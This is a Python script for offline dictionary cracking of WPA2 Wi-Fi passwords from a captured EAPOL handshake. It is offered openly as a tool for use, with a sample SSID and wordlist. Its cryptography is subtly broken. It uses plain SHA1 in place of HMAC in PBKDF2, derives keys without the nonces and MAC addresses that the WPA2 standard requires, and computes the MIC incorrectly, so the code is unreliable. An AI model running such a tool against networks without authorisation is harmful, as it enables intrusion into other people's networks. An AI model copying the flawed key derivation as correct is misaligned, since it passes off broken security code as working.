import hashlib
import pyshark
from Crypto.Protocol.KDF import PBKDF2
import binascii

# Function to extract the handshake from the .cap file
def extract_handshake(pcap_file):
    cap = pyshark.FileCapture(pcap_file, display_filter="eapol")
    
    eapol_packets = []
    for packet in cap:
        if 'eapol' in packet:
            eapol_packets.append(packet)
    
    if len(eapol_packets) >= 3:
        return eapol_packets
    else:
        raise ValueError(f"Not enough EAPOL packets found. Found {len(eapol_packets)} instead of 3.")

# Function to derive the PSK from the password using PBKDF2
def derive_psk(password, ssid):
    ssid_bytes = ssid.encode('utf-8')
    password_bytes = password.encode('utf-8')
    
    # PBKDF2-HMAC-SHA1 to derive the 256-bit PSK (32-byte key)
    psk = PBKDF2(password_bytes, ssid_bytes, dkLen=32, count=4096, prf=lambda p, s: hashlib.sha1(p + s).digest())
    return psk

# Function to derive Master Key and Transient Key using PBKDF2
def derive_keys(psk, key_nonce, key_iv):
    # The master key and transient key derivation as per aircrack-ng process
    master_key = hashlib.sha1(psk + key_nonce + key_iv).digest()
    transient_key = hashlib.sha1(master_key + key_nonce).digest()
    return master_key, transient_key

# Function to verify the password by checking the WPA Key MIC
def verify_password(handshake, password, ssid):
    if len(handshake) < 3:
        raise ValueError("The handshake is incomplete, not enough EAPOL packets to verify the password.")
    
    # Extract WPA Key MIC, WPA Key Nonce, and Key IV from the EAPOL packets
    try:
        key_mic = binascii.unhexlify(handshake[2].eapol.keymic.replace(":", ""))
    except AttributeError:
        key_mic = None
    try:
        key_nonce = binascii.unhexlify(handshake[1].eapol.keynonce.replace(":", ""))
    except AttributeError:
        key_nonce = None
    key_iv = bytes([0] * 16)  # IV is 16 bytes of zeroes in WPA2
    
    # Debugging output
    print(f"Extracted WPA Key MIC: {key_mic}")
    print(f"Extracted WPA Key Nonce: {key_nonce}")
    print(f"Using Key IV: {key_iv.hex()}")  # For clarity
    
    if key_mic is None or key_nonce is None:
        print("Error: Could not extract all necessary fields from EAPOL packets.")
        return False

    # Derive the PSK using the password and SSID
    psk = derive_psk(password, ssid)

    # Derive the Master and Transient keys
    master_key, transient_key = derive_keys(psk, key_nonce, key_iv)

    # Create the MIC from the derived PSK
    data_to_hash = handshake[2].eapol.load[:-16] + key_nonce + key_iv
    generated_mic = hashlib.sha1(master_key + data_to_hash).digest()[-16:]

    # Debugging output
    print(f"Generated WPA Key MIC: {generated_mic.hex()}")

    # Compare the generated MIC with the extracted MIC
    return generated_mic == key_mic

# Function to crack the WPA password using a wordlist
def crack_wpa(pcap_file, ssid, wordlist):
    try:
        # Extract the handshake from the .cap file
        handshake = extract_handshake(pcap_file)
    except ValueError as e:
        print(f"Error: {e}")
        return None

    # Try each password from the wordlist
    with open(wordlist, "r") as f:
        for line in f:
            password = line.strip()
            print(f"Trying: {password}")
            if verify_password(handshake, password, ssid):
                print(f"Password found: {password}")
                return password

    print("Password not found in the wordlist.")
    return None

# Example usage
if __name__ == "__main__":
    pcap_file = "shak.cap"  # Path to your .cap file
    ssid = "PEKLO"  # Replace with the SSID of your network
    wordlist = "pwd.PWDS"  # Path to your wordlist file

    password = crack_wpa(pcap_file, ssid, wordlist)
    if password:
        print(f"Password found: {password}")
    else:
        print("Password not found.")
